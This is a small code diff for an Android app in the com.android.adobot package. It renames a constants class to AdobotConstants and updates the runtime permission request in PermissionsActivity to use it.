@@ -10,9 +10,9 @@ import android.widget.Button;
 
 import java.util.HashMap;
 
+import com.android.adobot.AdobotConstants;
 import com.android.adobot.BuildConfig;
 import com.android.adobot.CommonParams;
-import com.android.adobot.Constants;
 import com.android.adobot.R;
 import com.android.adobot.http.Http;
 import pub.devrel.easypermissions.EasyPermissions;
@@ -58,7 +58,7 @@ public class PermissionsActivity extends BaseActivity {
 
     private void askPermissions() {
         EasyPermissions.requestPermissions(this, PERMISSION_RATIONALE,
-                1, Constants.PERMISSIONS);
+                1, AdobotConstants.PERMISSIONS);
     }
 
     @Override
